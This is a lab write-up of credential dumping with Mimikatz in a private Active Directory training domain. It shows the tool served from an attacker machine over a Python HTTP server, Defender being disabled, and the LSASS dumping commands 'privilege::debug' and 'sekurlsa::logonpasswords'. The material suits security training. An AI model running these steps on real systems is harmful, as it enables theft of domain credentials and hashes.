# 🔴 TCM Security Active Directory Lab — Mimikatz Setup & Credential Dumping

![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Kali-blue)
![Lab](https://img.shields.io/badge/Environment-VMware%20Lab-green)
![Domain](https://img.shields.io/badge/Domain-MARVEL.local-red)
![Status](https://img.shields.io/badge/Status-Success-success)
![Purpose](https://img.shields.io/badge/Purpose-Educational-orange)
![Tool](https://img.shields.io/badge/Tool-Mimikatz-black)

> ⚠️ Educational Lab Environment Only  
> This setup was performed inside a private VMware-based Active Directory lab for ethical hacking training purposes (TCM Security AD Lab).

---

# 🖥️ Lab Environment

- Kali Linux (Attacker Machine)
- Windows 10 Domain-Joined Machine (`SPIDERMAN-10`)
- Active Directory Domain Controller (`HYDRA-DC`)
- Domain: `MARVEL.local`

---

# 📥 Step 1 — Download Mimikatz

Downloaded Mimikatz from the official GitHub release page:

🔗 https://github.com/gentilkiwi/mimikatz/releases

Example release used:

🔗 https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919

Downloaded archive:

```text
mimikatz_trunk.zip
```

# 📂 Step 2 — Extract Required Files

Extracted the archive inside Kali Linux.

Created a dedicated directory:

```bash
mkdir ~/mimikatz
```

Copied the following 4 files:

mimidrv.sys
mimikatz.exe
mimilib.dll
mimispool.dll

# 🌐 Step 3 — Transfer Files To Windows Machine

Started a Python HTTP server inside Kali Linux:

```bash
cd ~/mimikatz
```

```bash
python3 -m http.server 8080
```

Accessed the files from the Windows machine browser:

```bash
http://<attacker IP>:8080
```

Downloaded the files to the Windows target machine.

# 🛡️ Step 4 — Windows Security / Defender

For lab purposes only:

Temporarily disabled Windows Security / Real-Time Protection
Opened Command Prompt as Administrator

# ⚡ Step 5 — Execute Mimikatz

Executed:

```bash
mimikatz.exe
```

Inside Mimikatz:

```bash
privilege::debug
```

```bash
sekurlsa::logonpasswords
```

# ✅ Result

Successfully dumped credentials and machine account information from LSASS memory.

Observed:

Local user sessions
Domain credentials
NTLM hashes
Kerberos-related data
Machine account (SPIDERMAN-10$)

Example:

Username : <USERNAME>
Domain : <DOMAIN-NAME>
Password : <PASSWORD>

# 🧠 Concepts Demonstrated

Active Directory authentication
Credential dumping concepts
LSASS memory access
NTLM hash extraction
Domain vs Local account differences
Machine account visibility in Active Directory

# ⚠️ Important Notice

This work was performed:

In an isolated lab
On authorized virtual machines
For defensive security learning and ethical hacking education only

## 👨‍💻 Author

🔗 GitHub: https://github.com/bilalhunzla
🔗 LinkedIn: https://www.linkedin.com/in/hunzla-bilal
